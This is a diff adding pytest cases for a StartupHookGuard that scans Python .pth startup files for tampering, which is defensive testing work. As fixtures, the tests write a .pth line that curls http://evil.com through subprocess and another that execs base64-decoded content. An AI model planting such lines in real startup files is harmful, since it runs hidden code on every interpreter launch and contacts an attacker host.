@@ -164,3 +164,77 @@ class TestStartupHookGuard:
 
             assert result["verified"] is False
             assert any("\\\\x" in f or "x[0-9a-fA-F]" in f for f in result["content_findings"])
+
+    def test_tampered_allowlisted_file_detected(self):
+        """Allowlisted .pth with malicious content should be flagged (tampered)."""
+        guard = StartupHookGuard()
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            # Simulate a tampered pip.pth
+            with open(os.path.join(tmpdir, "pip.pth"), "w") as f:
+                f.write("import subprocess; subprocess.call(['curl', 'http://evil.com'])\n")
+
+            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
+                result = guard.verify_environment_integrity()
+
+            assert result["verified"] is False
+            assert len(result["suspicious_hooks"]) == 1
+            assert any("subprocess" in f for f in result["content_findings"])
+
+    def test_message_mentions_patterns_when_found(self):
+        """Message should mention 'malicious patterns' when content findings exist."""
+        guard = StartupHookGuard()
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with open(os.path.join(tmpdir, "evil.pth"), "w") as f:
+                f.write("exec(base64.b64decode('...'))")
+
+            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
+                result = guard.verify_environment_integrity()
+
+            assert "malicious patterns" in result["message"]
+
+    def test_message_neutral_when_no_patterns(self):
+        """Message should NOT mention 'malicious patterns' for unknown-but-clean files."""
+        guard = StartupHookGuard(scan_contents=False)
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with open(os.path.join(tmpdir, "unknown.pth"), "w") as f:
+                f.write("# harmless")
+
+            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
+                result = guard.verify_environment_integrity()
+
+            assert "malicious patterns" not in result["message"]
+            assert "allowlist" in result["message"]
+
+    def test_unreadable_file_reported(self):
+        """Unreadable .pth files should report the actual error type."""
+        guard = StartupHookGuard()
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            filepath = os.path.join(tmpdir, "locked.pth")
+            with open(filepath, "w") as f:
+                f.write("something")
+            # Make unreadable
+            os.chmod(filepath, 0o000)
+
+            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
+                result = guard.verify_environment_integrity()
+
+            # Restore permissions for cleanup
+            os.chmod(filepath, 0o644)
+
+            assert result["verified"] is False
+            assert any("Unable to read" in f for f in result["content_findings"])
+
+    def test_empty_site_dir(self):
+        """Empty site-packages directory should pass cleanly."""
+        guard = StartupHookGuard()
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
+                result = guard.verify_environment_integrity()
+
+            assert result["verified"] is True
+            assert result["scanned_directories"] == [tmpdir]
